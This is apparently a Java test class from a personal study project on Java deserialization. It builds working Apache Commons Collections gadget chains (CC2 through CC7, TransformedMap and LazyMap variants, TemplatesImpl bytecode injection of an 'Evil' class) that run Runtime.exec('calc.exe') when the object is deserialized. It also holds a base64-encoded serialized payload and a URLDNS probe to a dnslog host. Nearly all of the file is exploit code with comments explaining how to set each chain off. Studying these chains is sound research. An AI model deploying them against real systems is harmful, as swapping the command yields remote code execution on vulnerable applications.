package com.endlessshw.serialization.test;

import com.endlessshw.serialization.util.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections4.Bag;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.map.TransformedMap;
import org.junit.jupiter.api.Test;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.InputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;

import static com.endlessshw.serialization.util.SerializeUtil.serialize;
import static com.endlessshw.serialization.util.SerializeUtil.unSerialize;

/**
 * @author hasee
 * @version 1.0
 * @description: 测试 transformed 的测试类
 * @date 2023/4/5 11:26
 */
public class CCTest {

    @Test
    public void testCC7() throws Exception {
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 chain2
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(new HashMap<>(), new ChainedTransformer());

        // 3. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(lazyMap, "EndlessShw");

        // 4. 创建 HashTable 和 HashMap，通过反射修改其 Map 为 HashMap
        Hashtable<Object, Object> toBeSerHashTable = new Hashtable<>();
        toBeSerHashTable.put(lazyMapTiedMapEntry, "随便");

        // 5. 将 LazyMap 中存放的 key 删除
        lazyMap.remove("EndlessShw");

        // 6. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerHashTable);
        unSerialize(serialize);
    }

    @Test
    public void testCC4_2() throws Exception {
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 3. 构造 chain - 这里不能一开始就放入 ConstantTransformer 和 InstantiateTransformer，
        //    否则在 treeBag.add(templates) 时会触发链条从而导致报错。
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>("1"),
                new ConstantTransformer<>("2"),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(transformedChain);

        // 4. 构造 kick-off 并和 chain 相连
        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(templates);

        // 5. 这里通过反射将 chain 改回来
        transformers[0] = new ConstantTransformer<>(TrAXFilter.class);
        transformers[1] = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        Field iTransformersField = transformedChain.getClass().getDeclaredField("iTransformers");
        iTransformersField.setAccessible(true);
        iTransformersField.set(transformedChain, transformers);

        String serialize = serialize(treeBag);
        unSerialize(serialize);
    }

    @Test
    public void testCC4_1() throws Exception {
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 3. 构造 chain - InstantiateTransformer 和 ChainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(TrAXFilter.class),
                new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(transformedChain);

        // 4. 构造 kick-off
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>();
        priorityQueue.add("1");
        priorityQueue.add("2");
        // su18 师傅这里该用获取 queue 后修改第一个元素的方法，我这里就直接新建一个覆盖
        Field queueField = priorityQueue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        // 如果像 su18 师傅那样只修改一个的话，那么第二个元素因为不是 TransformerImpl，从而无法调用 `newTransformer()` 而报错
        // 尝试全改成了这个类，结果是命令会调用两次，虽然解决了这个报错，但是最终会引起 TransformerImpl cannot be cast to java.lang.Comparable
        // 只能说，逃不掉的，报错是一定的。
        queueField.set(priorityQueue, new TemplatesImpl[]{templates, templates});

        // 5. 将 kick-off 和 chain 相连
        Field comparatorField = priorityQueue.getClass().getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue, transformingComparator);

        String serialize = serialize(priorityQueue);
        unSerialize(serialize);
    }


    @Test
    public void testCC3() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, NoSuchFieldException {
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 3. 构造 InstantiateTransformer 和 ChainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(TrAXFilter.class),
                new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);


        // 2. 构造 LazyMap（同时也相当于创建被代理类）
        HashMap<Object, Object> map = new HashMap<>();
        LazyMap lazyMap = LazyMap.lazyMap(map, transformedChain);

        // 3. 把 AnnotationInvocationHandler 的构造函数搞出来
        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);

        // 4. 先搞出来一个调用处理器，这里第一个参数没有要求
        InvocationHandler invocationHandler = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, lazyMap);

        // 5. 创建代理对象（被代理类已经创建好了）
        // System.out.println(Arrays.toString(lazyMap.getClass().getInterfaces()));
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 6. 实例化并被序列化的对象（注意这里要传入代理对象，这样才能在其 readObject() 中调用代理对象的方法（即 entrySet()）
        Object toBeSerializedObj = aIHClassDeclaredConstructor.newInstance(Override.class, proxyMap);

        String serialize = serialize(toBeSerializedObj);
        unSerialize(serialize);
    }

    @Test
    public void testCC2_su18() throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 初始化 PriorityQueue
        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");


        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "su18");

        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(queue);
        objects[0] = tmpl;
        objects[1] = tmpl;

        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
        // 这个类是 public 的，方便调用
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator comparator = new TransformingComparator(transformer);

        Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue, comparator);

        String serialize = serialize(queue);
        unSerialize(serialize);

    }

    @Test
    public void testCC2() throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 3. 构造 chain
        // newTransform() 无参数，后面两个就直接 new 出来了
        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(invokerTransformer);

        // 4. 构造 kick-off
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>();
        priorityQueue.add("1");
        priorityQueue.add("2");
        // su18 师傅这里该用获取 queue 后修改第一个元素的方法，我这里就直接新建一个覆盖
        Field queueField = priorityQueue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        // 如果像 su18 师傅那样只修改一个的话，那么第二个元素因为不是 TransformerImpl，从而无法调用 `newTransformer()` 而报错
        // 尝试全改成了这个类，结果是命令会调用两次，虽然解决了这个报错，但是最终会引起 TransformerImpl cannot be cast to java.lang.Comparable
        // 只能说，逃不掉的，报错是一定的。
        queueField.set(priorityQueue, new TemplatesImpl[]{templates, templates});

        // 5. 将 kick-off 和 chain 相连
        Field comparatorField = priorityQueue.getClass().getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue, transformingComparator);

        String serialize = serialize(priorityQueue);
        unSerialize(serialize);
    }

    @Test
    public void testCC5() throws NoSuchFieldException, IllegalAccessException {
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 chain2
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(new HashMap<>(), new ChainedTransformer());

        // 3. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(lazyMap, "EndlessShw");

        // 4. 通过反射修改 BadAttributeValueExpException 的 val
        BadAttributeValueExpException toBeSerBAVEException = new BadAttributeValueExpException("123");
        Field valField = toBeSerBAVEException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(toBeSerBAVEException, lazyMapTiedMapEntry);

        // 5. 将 LazyMap 中存放的 key 删除
        lazyMap.remove("EndlessShw");

        // 6. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerBAVEException);
        unSerialize(serialize);
    }

    @Test
    public void testCC6_2_Change() throws NoSuchFieldException, IllegalAccessException {
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 chain2
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(new HashMap<>(), new ChainedTransformer());

        // 3. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(lazyMap, "EndlessShw");

        // 4. 创建 HashSet 和 HashMap，这里直接通过构造函数来传入
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(lazyMapTiedMapEntry, "EndlessShw");
        HashSet toBeSerializedHashSet = new HashSet(hashMap.keySet());

        // 5. 将 LazyMap 中存放的 key 删除
        lazyMap.remove("EndlessShw");

        // 6. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerializedHashSet);
        unSerialize(serialize);
    }

    @Test
    public void testCC6_2() throws NoSuchFieldException, IllegalAccessException {
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 chain2
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(new HashMap<>(), new ChainedTransformer());

        // 3. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(lazyMap, "EndlessShw");

        // 4. 创建 HashSet 和 HashMap，通过反射修改其 Map 为 HashMap
        HashSet toBeSerializedHashSet = new HashSet();
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(lazyMapTiedMapEntry, "EndlessShw");
        Field mapField = toBeSerializedHashSet.getClass().getDeclaredField("map");
        mapField.setAccessible(true);
        mapField.set(toBeSerializedHashSet, hashMap);

        // 5. 将 LazyMap 中存放的 key 删除
        lazyMap.remove("EndlessShw");

        // 6. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerializedHashSet);
        unSerialize(serialize);
    }

    @Test
    public void testCC6() throws NoSuchFieldException, IllegalAccessException {
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. kick-off 创建 HashMap
        HashMap<Object, Object> toBeSerializedHashMap = new HashMap<>();

        // 3. 构建 chain2，创建 LazyMap，先不传链的后半部分，让链断开，这样 put 时调用 HashMap.hashCode() 时不会触发链
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(new HashMap<>(), new ChainedTransformer());

        // 4. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(lazyMap, "EndlessShw");

        // 5. 将 kick-off 和 chain 相连
        toBeSerializedHashMap.put(lazyMapTiedMapEntry, "随便");

        // 6. 把 lazyMap 中塞入的 key 给去掉
        lazyMap.remove("EndlessShw");
        // 当然也可以使用 clear
        // lazyMap.clear();

        // 7. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerializedHashMap);
        unSerialize(serialize);
        // System.out.println(serialize);
        // unSerialize("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQACkVuZGxlc3NTaHdzcgArb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAABHNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAAG6ZqP5L6/eA==");

    }

    @Test
    public void testTransformedMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        // 构造转换器链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 触发转换器链内所有转换器的 transform()
        HashMap<String, String> hashMap = new HashMap<>();
        TransformedMap<String, String> transformedMap = TransformedMap.transformingMap(hashMap, null, transformedChain);
        hashMap.put("value", "随便");
        // transformedMap.entrySet().iterator().next().setValue("123");

        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);
        // 通过 class 类对象的构造函数实例化对象
        // 这里第一个参数要注意，
        Object newInstance = aIHClassDeclaredConstructor.newInstance(Target.class, transformedMap);
        String serialize = serialize(newInstance);
        unSerialize(serialize);
    }

    @Test
    public void testLazyMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        // 1. 构造链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };

        Transformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 LazyMap（同时也相当于创建被代理类）
        HashMap<Object, Object> map = new HashMap<>();
        LazyMap lazyMap = LazyMap.lazyMap(map, transformedChain);

        // 3. 把 AnnotationInvocationHandler 的构造函数搞出来
        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);

        // 4. 先搞出来一个调用处理器，这里第一个参数没有要求
        InvocationHandler invocationHandler = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, lazyMap);

        // 5. 创建代理对象（被代理类已经创建好了）
        System.out.println(Arrays.toString(lazyMap.getClass().getInterfaces()));
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 6. 实例化并被序列化的对象（注意这里要传入代理对象，这样才能在其 readObject() 中调用代理对象的方法（即 entrySet()）
        Object toBeSerializedObj = aIHClassDeclaredConstructor.newInstance(Override.class, proxyMap);

        // 7. 序列化
        String serializedStr = serialize(toBeSerializedObj);

        unSerialize(serializedStr);
    }

    @Test
    public void testDNSLog() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL, Integer> hashMap = new HashMap<URL, Integer>();
        // 1. 创建 URL，其访问地址为 burp 生成的用于检测 DNSLog 的，当然 dnslog 也行
        URL url = new URL("http://apcv57.dnslog.cn/");

        // 2. 在 put 前通过反射将键为 url 的 hashCode 改成 -1
        Class<? extends URL> urlClass = url.getClass();
        // 获取对象内的属性
        Field hashCode = urlClass.getDeclaredField("hashCode");
        // 忽略其安全限制（无效化 private、protected 关键字）
        hashCode.setAccessible(true);
        // put 前改为非 -1
        hashCode.setInt(url, 1);

        // 3. 塞进去
        hashMap.put(url, 1);

        // 4. 序列化前改回 -1
        hashCode.setInt(url, -1);

        // 5. 序列化
        String serialize = serialize(hashMap);
        unSerialize(serialize);
    }

    @Test
    public void test() throws InstantiationException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        // HashMap<Object, Object> hashMap = new HashMap<>();
        // hashMap.put("key1", "value1");
        // hashMap.put("key2", "value2");
        // HashSet hashSet = new HashSet<>(hashMap.keySet());
        // System.out.println(hashSet);

        // TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry<>(new HashMap<>(), "EndlessShw");

        // 构造恶意类并转换为字节码
        // ClassPool pool = ClassPool.getDefault();
        // CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        // byte[] bytes = ctClass.toBytecode();

        // 通过反射获取数组
        TemplatesImpl templates = new TemplatesImpl();
        Field _classField = templates.getClass().getDeclaredField("_class");
        _classField.setAccessible(true);
        Class[] classes = new Class[1];
        classes[0] = Class.forName("com.endlessshw.serialization.util.Evil");
        _classField.set(templates, classes);
        Field transletIndexField = templates.getClass().getDeclaredField("_transletIndex");
        transletIndexField.setAccessible(true);
        transletIndexField.set(templates, 0);
        Method getTransletInstance = templates.getClass().getDeclaredMethod("getTransletInstance");
        getTransletInstance.setAccessible(true);
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "随便");
        getTransletInstance.invoke(templates);
    }
}
